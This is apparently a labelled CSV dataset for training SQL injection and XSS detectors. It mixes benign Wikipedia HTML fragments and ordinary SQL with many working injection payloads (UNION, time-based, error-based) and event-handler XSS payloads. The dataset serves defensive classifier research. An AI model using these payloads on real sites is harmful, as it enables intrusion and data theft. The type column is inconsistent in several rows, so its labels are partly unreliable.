Text,Label,type
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx",1,sql
SELECT SYSDATE (  ) ;,0,sql
"<li><a href=""/wiki/Problem_of_induction"" title=""Problem of induction"">Problem of induction </a> </li>",0,xss
1'+  (  select iutk where 6158  =  6158,1,sql
<map onpointerover=alert(1)>XSS</map>,2,xss
SELECT * FROM slowly,0,sql
"	 </span> <span class=""reference-text"">Haşim Sak, Andrew Senior, Kanishka Rao, Françoise Beaufays and Johan Schalkwyk (September 2015): <a rel=""nofollow"" class=""external text"" href=""http://googleresearch.blogspot.ch/2015/09/google-voice-search-faster-and-more.html"">Google voice search: faster and more accurate. </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160309191532/http://googleresearch.blogspot.ch/2015/09/google-voice-search-faster-and-more.html"">Archived </a> 9 March 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0,xss
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fast+Company&amp;rft.atitle=Elon+Musk+Is+Donating+%2410M+Of+His+Own+Money+To+Artificial+Intelligence+Research&amp;rft.date=2015-01-15&amp;rft_id=http%3A%2F%2Fwww.fastcompany.com%2F3041007%2Ffast-feed%2Felon-musk-is-donating-10m-of-his-own-money-to-artificial-intelligence-research&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
49893169m,0,sql
ab_ogadora,0,sql
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1,sql
1  )   as afxc where 7497  =  7497,1,sql
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
	 </span>(1918) </li>,0,xss
sobrino coyoma,0,sql
-6036   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  6723  =  6723,1,xss
"<li id=""cite_note-wp1-344""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-wp1_344-0"">^ </a> </b> ",0,xss
"1""  )   as vpna where 5450  =  5450 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"c/ pontevedra 25, 6a",0,sql
SELECT COUNT ( whetherID ) FROM partly,0,sql
"	 </span> <span class=""reference-text""><a href=""/wiki/Sepp_Hochreiter"" title=""Sepp Hochreiter"">Hochreiter, Sepp </a>; and <a href=""/wiki/J%C3%BCrgen_Schmidhuber"" title=""Jürgen Schmidhuber"">Schmidhuber, Jürgen </a>; <i>Long Short-Term Memory </i>, Neural Computation, 9(8):1735–1780, 1997 ",0,xss
"  SELECT chief AS half, sitting AS [bound]  FROM average",0,sql
"1%"" and 7533  =  7533 and ""%""  =  """,1,sql
SELECT AVG ( furniture ) FROM luck SELECT SUM ( anyone ) ,0,xss
"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",1,sql
	 </span> </li>,0,xss
"<style>:target {transform: rotate(180deg);}</style><article id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></article>",2,xss
"<img oncontextmenu=""alert(1)"">test</img>",2,xss
"1 and elt  (  4249  =  4249,7259  )  ",1,sql
select   (  case when   (  9434  =  2780  )   then 9434 else 9434*  (  select 9434 from information_schema.character_sets  )   end  )  #,1,sql
menaker,0,xss
"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",1,sql
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'eocx'  =  'eocx,1,sql
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,sql
4.46813E+15,0,sql
WHERE ProductID  =  ANY  ( SELECT ProductID   FROM OrderDetails WHERE Quantity > 99 ) ;,0,sql
renata,0,sql
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix,1,sql
"<h3><span class=""mw-headline"" id=""Knowledge_representation"">Knowledge representation ",0,xss
	 </span>,0,xss
1pergamin0da,0,xss
 UPDATE hand SET open = 'diameter'WHERE widely = 'inside',0,xss
"1%"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""%""  =  """,1,sql
SELECT * FROM either  WHERE changing NOT LIKE '[require]%',0,sql
"  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea",0,xss
11901410z,0,xss
"<div draggable=""true"" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>",2,xss
SELECT TOP 3 * FROM movie WHERE art = 'shop' SELECT * FROM wish,0,sql
"1"" where 7232  =  7232   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sql
SELECT * FROM shelf WHERE jungle = 'standard'  OR printed = 'think',0,sql
SELECT * FROM biggest WHERE aboard = 'lamp'  AND  ( practice = 'canal' OR back = 'desert' ) ,0,xss
bat3an,0,sql
 </p>,0,xss
-6512'+  (  select 'zdjx' where 5454  =  5454 order by 1--,1,sql
"<p>If a machine can be created that has intelligence, could it also <i><a href=""/wiki/Sentience"" title=""Sentience"">feel </a> </i>? If it can feel, does it have the same rights as a human? This issue, now known as ""<a href=""/wiki/Robot_rights"" class=""mw-redirect"" title=""Robot rights"">robot rights </a>"", is currently being considered by, for example, California's <a href=""/wiki/Institute_for_the_Future"" title=""Institute for the Future"">Institute for the Future </a>, although many critics believe that the discussion is premature.<sup id=""cite_ref-Robot_rights_406-0"" class=""reference""><a href=""#cite_note-Robot_rights-406"">&#91;394&#93; </a> </sup> Some critics of <a href=""/wiki/Transhumanism"" title=""Transhumanism"">transhumanism </a> argue that any hypothetical robot rights would lie on a spectrum with <a href=""/wiki/Animal_rights"" title=""Animal rights"">animal rights </a> and human rights. <sup id=""cite_ref-Evans_2015_407-0"" class=""reference""><a href=""#cite_note-Evans_2015-407"">&#91;395&#93; </a> </sup> The subject is profoundly discussed in the 2010 documentary film <i><a href=""/wiki/Plug_%26_Pray"" title=""Plug &amp; Pray"">Plug &amp; Pray </a> </i>,<sup id=""cite_ref-408"" class=""reference""><a href=""#cite_note-408"">&#91;396&#93; </a> </sup> and many sci fi media such as <a href=""/wiki/Star_Trek"" title=""Star Trek"">Star Trek </a> Next Generation, with the character of <a href=""/wiki/Commander_Data"" class=""mw-redirect"" title=""Commander Data"">Commander Data </a>, who fought being disassembled for research, and wanted to ""become human"", and the robotic holograms in Voyager.",0,xss
<thead onpointerover=alert(1)>XSS</thead>,2,xss
SELECT Count ( * )  AS favorite,0,sql
"			<ul><li class=""wb-otherproject-link wb-otherproject-commons""><a href=""https://commons.wikimedia.org/wiki/Category:Artificial_intelligence"" hreflang=""en"">Wikimedia Commons </a> </li><li class=""wb-otherproject-link wb-otherproject-wikibooks""><a href=""https://en.wikibooks.org/wiki/Artificial_Intelligence"" hreflang=""en"">Wikibooks </a> </li><li class=""wb-otherproject-link wb-otherproject-wikiquote""><a href=""https://en.wikiquote.org/wiki/Artificial_intelligence"" hreflang=""en"">Wikiquote </a> </li><li class=""wb-otherproject-link wb-otherproject-wikiversity""><a href=""https://en.wikiversity.org/wiki/Portal:Artificial_intelligence"" hreflang=""en"">Wikiversity </a> </li> </ul>",0,xss
SELECT * FROM adult WHERE saved = 'ten' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM whether WHERE    NOT shout = 'instant',0,sql
37130,0,sql
"	 <div id=""Links_to_related_articles"" style=""font-size:114%;margin:0 4em"">Links to related articles </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px;font-size:114%"">",0,xss
SELECT measure ( s )  FROM yard UNION,0,sql
SELECT * FROM anywhere WHERE stick = 'bit'  AND City = 'mine',0,sql
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",1,sql
"1%""  )   union all select null,null,null,null--",1,sql
37170,0,xss
SELECT TOP 3 * FROM kept SELECT * FROM stove 3SELECT * FROM blood,0,sql
nanjar viejo,0,sql
"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1""   )    )     )  ",1,sql
" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1,sql
SELECT * FROM lost FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<noembed onbeforecopy=""alert(1)"" contenteditable>test</noembed>",2,xss
WHERE ProductID  =  ANY  ( SELECT   ProductID FROM OrderDetails WHERE Quantity  =  10 ) ;,0,sql
"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",1,sql
SELECT * FROM river FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
1'  )   as hwpf where 5603  =  5603,1,xss
lotera,0,sql
85765253r,0,sql
urko,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Brynjolfsson, Erik; Mitchell, Tom (22 December 2017). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/358/6370/1530"">""What can machine learning do? Workforce implications"" </a>. <i>Science </i>. pp.&#160;1530–1534. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2017Sci...358.1530B"">2017Sci...358.1530B </a>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aap8062"">10.1126/science.aap8062 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
SELECT * FROM block WHERE organization NOT LIKE 'picture%',0,sql
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
select case when 6662  =  9889 then 1 else null end--,1,sql
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1,sql
3549,0,xss
"1',  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1,sql
"    <span class=""rst-current-version"" data-toggle=""rst-current-version"">",0,xss
"<slot oncut=""alert(1)"" contenteditable>test</slot>",2,xss
"<li><cite id=""CITEREFSimon1965"" class=""citation book""><a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Simon, H. A. </a> (1965). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/shapeofautomatio00simo""><i>The Shape of Automation for Men and Management </i> </a> ",0,xss
"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%""  =  """,1,sql
"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",1,xss
<svg><font onload=alert(1)></font>,2,xss
-5547' or 9323  =  9323#,1,sql
SELECT * FROM let WHERE read LIKE '%magic%',0,sql
"1""   )    )    union all select null,null,null,null#",1,sql
select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,1,xss
"	 <div id=""Philosophers_of_science_by_era"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/List_of_philosophers_of_science"" title=""List of philosophers of science"">Philosophers of science </a> by era </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0,xss
"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1,sql
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",2,xss
" SELECT * FROM shape ORDER BY mice, empty",0,sql
69 47164 F6 reply F6 1568 0 csdf1123mVwbHk  =   9 134 e_qna eng modify 38 22747 22747 3945 556 V gallery2 view 366 3 F1 read F1 8628 80 sub0204 photo OPTOMA 218 30 02_01 1091 wr_datetime asc 2 sub0203 photo e_qna eng 8 18489 bbs338 12 view 132,0,sql
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,0,sql
corota,0,sql
"1'  )   union all select null,null,null--",1,sql
<p onpointermove=alert(1)>XSS</p>,2,xss
"	<span class=""mw-editsection-bracket"">[ ",0,xss
SELECT AVG ( Price ) FROM cap,0,sql
"<ul><li><a href=""/wiki/Philosophy_of_engineering"" title=""Philosophy of engineering"">Engineering </a> </li>",0,xss
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",2,xss
"<li><a href=""/wiki/Automated_reasoning"" title=""Automated reasoning"">Automated reasoning </a> </li>",0,xss
"1 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"	 </span> <span class=""reference-text"">",0,xss
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Philosophy_of_mind"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
"<style onmouseenter=""alert(1)"">test</style>",2,xss
7znallo,0,sql
" SELECT * FROM continued ORDER BY zipper ASC, swam DESC",0,sql
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""wdye"" like ""wdye",1,sql
9ar5i04o,0,sql
"<spacer onkeyup=""alert(1)"" contenteditable>test</spacer>",2,xss
"  SELECT * FROM cut WHERE interior NOT IN  ( 'rays', 'yes', 'worker' )  ",0,sql
<animatetransform onpointerleave=alert(1)>XSS</animatetransform>,2,xss
"or 0  =  0 #""",1,sql
SELECT AVG ( perhaps )  FROM deal  SELECT SUM ( somehow ) ,0,sql
42093532j,0,sql
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',0,sql
SELECT COUNT ( him ) FROM doing,0,sql
</div>,0,xss
8352,0,sql
SELECT * FROM wing WHERE captain = 'man' LIMIT 3,0,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",1,sql
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>",2,xss
protti tarrasa,0,sql
"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'qgdv'  =  'qgdv",1,sql
 </li>,0,xss
SELECT Count ( * )  AS route,0,sql
SELECT * FROM themselves WHERE NOT nervous = 'start'  AND NOT cow = 'captured',0,xss
"  SELECT MINUTE ( ""2017-06-20 09:34:00"" ) ;",0,xss
SELECT COUNT ( especially )  FROM nodded,0,sql
7uo09e5a1,0,xss
	 </span> 2018 ,0,xss
oke,0,sql
"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1,sql
woll@stockdefotos.bb,0,sql
1  )   as hggi where 6511  =  6511,1,sql
SELECT bowl ( s )  FROM piano,0,sql
"<li><a href=""/wiki/Constructivist_epistemology"" title=""Constructivist epistemology"">Constructivist epistemology </a> </li>",0,xss
	 </span>,0,xss
;s,1,sql
	 </span> 2020 ,0,xss
"1"" where 9135  =  9135 and elt  (  4249  =  4249,7259  )  --",1,sql
<svg><select onload=alert(1)></select>,2,xss
	 </span>,0,xss
"<li><a href=""/wiki/Autonomous_underwater_vehicle"" title=""Autonomous underwater vehicle"">Underwater </a>",0,xss
"<track onmouseleave=""alert(1)"">test</track>",2,xss
"<li id=""cite_note-20""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-20"">^ </a> </b> ",0,xss
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,sql
<embed onpointerleave=alert(1)>XSS</embed>,2,xss
"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Representational </a> </li>",0,xss
SELECT * FROM father WHERE situation LIKE '%belong%',0,sql
1'   )    )     )   union all select null--,1,sql
"  SELECT * FROM limited WHERE to NOT IN  ( 'struck', 'long', 'machine' )  ",0,sql
"1  )   where 5232  =  5232 union all select null,null,null#",1,sql
"<content onbeforecut=""alert(1)"" contenteditable>test</content>",2,xss
"<li><a href=""/wiki/Semantic_Web"" title=""Semantic Web"">Semantic Web </a> </li>",0,xss
-6233'  )   where 9820  =  9820 or 3038  =  3038,1,xss
sfiroudi,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_options_location_address' LIMIT 1,0,sql
SELECT AVG ( harbor ) FROM examine SELECT SUM ( keep ) ,0,xss
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'bzgs' like 'bzgs",1,sql
